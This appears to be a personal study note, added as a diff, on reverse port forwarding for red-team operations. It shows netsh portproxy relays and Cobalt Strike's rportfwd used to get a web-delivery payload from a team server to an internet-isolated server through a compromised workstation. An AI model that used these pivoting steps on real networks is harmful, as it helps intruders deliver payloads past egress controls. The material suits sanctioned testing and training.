@@ -1,0 +1,108 @@
+---
+creation date: September 24th 2022
+last modified date: September 24th 2022
+aliases: []
+tags: #📕
+---
+
+Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
+Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
+Links: {Add link(s) [[]] to related terms}
+Search Tag: #📕  
+
+# [[Reverse Port Forwards]]  
+___
+
+## Description:  
+
+
+### Powershell
+
+The native `netsh` (short for Network Shell) utility allows you to view and configure various networking components on a machine, including the firewall.  There's a subset of commands called `interface portproxy` which can proxy both IPv4 and IPv6 traffic between networks.
+
+The syntax to add a **v4tov4** proxy is:
+
+```
+netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+```
+
+-   **listenaddress** is the IP address to listen on (probably always 0.0.0.0).
+-   **listenport** is the port to listen on.
+-   **connectaddress** is the destination IP address.
+-   **connectport** is the destination port.
+-   **protocol** to use (always TCP).
+
+on the relay,  create a portproxy that will listen on 4444 and forward the traffic to the target, also on 4444.
+
+```
+C:\>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
+```
+you can check it's there with `netsh interface portproxy show`.
+
+
+Now from your host, instead of trying to connect to the target, connect to the portproxy relay
+```
+PS C:\> Test-NetConnection -ComputerName 10.10.17.71 -Port 4444
+
+ComputerName     : 10.10.17.71
+RemoteAddress    : 10.10.17.71
+RemotePort       : 4444
+InterfaceAlias   : Ethernet
+SourceAddress    : 10.10.15.75
+TcpTestSucceeded : True
+```
+
+To remove the portproxy:
+```
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
+```
+
+### CobaltStrike
+
+In many corporate environments, workstations are able to browse the Internet on ports 80 and 443, but servers have no direct outbound access (because why do they need it?).
+
+Let's imagine that we already have foothold access to a workstation and have a means of moving laterally to a server - we need to deliver a payload to it but it doesn't have Internet access to pull it from our Team Server. We can use the workstation foothold as a relay point between our webserver and the target.
+
+Host a scripted web delivery payload and then attemp to download it from the server
+
+```
+PS C:\> hostname
+dc-2
+
+PS C:\> iwr -Uri http://10.10.5.120/a
+iwr : Unable to connect to the remote server
+```
+
+The syntax for the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`. On the workstation (forward host and port should point to your payload on the team server):
+
+```
+beacon> rportfwd 8080 10.10.5.120 80
+[+] started reverse port forward on 8080 to 10.10.5.120:80
+```
+
+This will bind port **8080** on the foothold machine, which we can see with **netstat**.
+
+```
+beacon> run netstat -anp tcp
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
+```
+
+Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On the server, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of WKSTN-1).
+
+
+
+
+___
+
+## Resources:
+
+| Hyperlink | Info |
+| --------- | ---- |
+
+
+Created Date: September 24th 2022 (09:49 am)  
+Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
